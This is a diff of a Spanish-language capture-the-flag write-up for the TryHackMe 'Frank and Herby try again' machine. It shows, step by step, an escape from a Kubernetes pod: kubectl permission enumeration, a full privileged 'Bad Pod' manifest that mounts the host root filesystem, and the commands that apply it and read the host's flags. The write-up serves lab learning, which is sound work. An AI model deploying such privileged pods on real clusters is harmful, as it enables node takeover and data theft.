@@ -304,7 +304,7 @@ Listando las variables de entorno vemos que si que verdaderanmente kubernete est
     (local) pwncat$
     Active Session: 10.10.62.132:40359  
     
-##Enumeramos Kubernete
+## Enumeramos Kubernete
 
 -Nos descargamos kubectl URL--> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/
 
@@ -326,10 +326,10 @@ damos permisos de ejecucion ya que de lo contrario no podremos ejecutarlo
     
     (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# chmod +x kubectl 
 
--Listamos permisos que tenemos sobre los nodos.
+-Listamos permisos que tenemos sobre el espacio de trabajo.
 
 Con la ayuda de kubectl hemos conseguido ver que acciones podemos realizar, los dos comandos nos indican lo mismo si no me equivoco(# Check to see if I can do everything in my current namespace)
-por lo que vemos tenemos total privilegio en nuestro Worker node.
+por lo que vemos tenemos total privilegio en nuestro espacio de trabajo.
 
     (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl auth can-i '*' '*'
     yes
@@ -340,50 +340,113 @@ por lo que vemos tenemos total privilegio en nuestro Worker node.
                 [*]                 []               [*]
 
 
-## Elevamos privilegios en kubernetes.
+## Explotacion del sistema, obtencion de flags.
 
 Buscando info encontramos el siguiente articulo bastante interesante donde nos muestra varios metodos para Escalar Privilegios desde los pods de kubernete.
 INFO: https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
     
-En nuestro caso nos guiaremos por este metodo Bad Pod #1: Everything Allowed, el cual nos pemite montar el sistema de archivos del host en un nuevo pod, pudiendo asi llevar a ver las flags.
+En nuestro caso nos guiaremos por este metodo Bad Pod #1: Everything Allowed.
 
-1)Listamos los pods y obtenemos su informacion en formato yaml
+Explicacion : El proceso que haremos a continuacion sera crear un pod que montara el sistema de ficheros raiz de la maquina host(nodo microk8s)  en el directorio /host de nuestro pod, de esta manera podemos acceder al sistema de ficheros por completo del nodo y por consiguiente a las flags.
 
-    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl get pods
-    NAME                          READY   STATUS    RESTARTS       AGE
-    php-deploy-6d998f68b9-wlslz   1/1     Running   3 (162m ago)   507d
+1)Obtenemos info sobre nodos,namespace y pods que es estan corriendo
+
+    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl get node
+    NAME       STATUS   ROLES    AGE    VERSION
+    microk8s   Ready    <none>   508d   v1.23.4-2+98fc2022f3ad3e
     
-    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl get pods php-deploy-6d998f68b9-wlslz -o yaml
+    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl get namespace
+    NAME              STATUS   AGE
+    kube-system       Active   508d
+    kube-public       Active   508d
+    kube-node-lease   Active   508d
+    default           Active   508d
+    frankland         Active   508d
+    
+    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl get pods -o wide
+    NAME                          READY   STATUS    RESTARTS      AGE    IP             NODE       NOMINATED NODE   READINESS GATES
+    php-deploy-6d998f68b9-wlslz   1/1     Running   3 (12m ago)   507d   10.1.128.212   microk8s   <none>           <none>
+    
+2) Buscamos la info necesaria para montar nuestro Bad Pod, para ello obtenemos la info del pod que esta coriendo actualmente que es el unico que hay.
+
+        (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl describe pods | grep -P "Name:|Namespace:|Node:|Image:"
+   
+        Name:             php-deploy-6d998f68b9-wlslz
+        Namespace:        frankland
+        Node:             microk8s/10.10.253.69
+        Image:          vulhub/php:8.1-backdoor
+         
+3)Montamos nuestro Bad Pod, para ello nos basaremos en la siguiente estructura. Link --> https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
+
+Fichero de configuracion de nuestro pod, esevka.yaml
+
     apiVersion: v1
     kind: Pod
     metadata:
-      annotations:
-        cni.projectcalico.org/podIP: 10.1.128.214/32
-        cni.projectcalico.org/podIPs: 10.1.128.214/32
-      creationTimestamp: "2022-03-21T17:26:38Z"
-      generateName: php-deploy-6d998f68b9-
+      name: esevka
       labels:
-        app: php-deploy
-        pod-template-hash: 6d998f68b9
-      name: php-deploy-6d998f68b9-wlslz
-      namespace: frankland
-      ownerReferences:
-      - apiVersion: apps/v1
-        blockOwnerDeletion: true
-        controller: true
-        kind: ReplicaSet
-        name: php-deploy-6d998f68b9
-        uid: cac0fc0e-89b0-47cd-adb0-53852e68904e
-      resourceVersion: "121969"
-      selfLink: /api/v1/namespaces/frankland/pods/php-deploy-6d998f68b9-wlslz
-      uid: 1217f52a-fe60-4948-9788-fba1196fb35e
+        app: pentest
     spec:
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
       containers:
-      - image: vulhub/php:8.1-backdoor
-        imagePullPolicy: IfNotPresent
-        name: php-deploy
-        ports:
-        - containerPort: 80
+      - name: esevka
+        image: vulhub/php:8.1-backdoor
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: noderoot
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "while true; do sleep 30; done;" ]
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+      volumes:
+      - name: noderoot
+        hostPath:
+          path: /
+    
+4)Subimos nuestro fichero de configuracion a la maquina victima.
 
+    (local) pwncat$ upload esevka.yaml /tmp/esevka.yaml
+    /tmp/esevka.yaml ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 604/604 bytes • ? • 0:00:00
+    [18:20:04] uploaded 604.00B in 2.06 seconds                                                                                                                       upload.py:76
+
+5)Creamos nuestro Bad pod
+
+    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl apply -f esevka.yaml 
+    pod/esevka created
+    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl  get pods
+    NAME                          READY   STATUS    RESTARTS      AGE
+    php-deploy-6d998f68b9-wlslz   1/1     Running   3 (30m ago)   507d
+    esevka                        1/1     Running   0             8s
+
+6) Ejecutamos comandos en nuestro pod para poder obtener las flags
+
+   -Como nuestro pod acepta comandos, obtenemos una shell en el host(nodo) en el que estan nuestro pods ejecutandose.
+
+       (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl exec esevka -it -- /bin/bash
+        root@microk8s:/var/www/html#
+
+   -Flags
+  
+         root@microk8s:/host/home/herby# cat user.txt 
+            THM{I-2h0uld-----fr4nK}
+
+         root@microk8s:/host/root# cat root.txt 
+            THM{frank-and------still-suck}
+
+
+---
+---> Maquina Frank and Herby try again... completa. <---
+---
+---
+
+
+       
+       
+    
+
+    
     
 
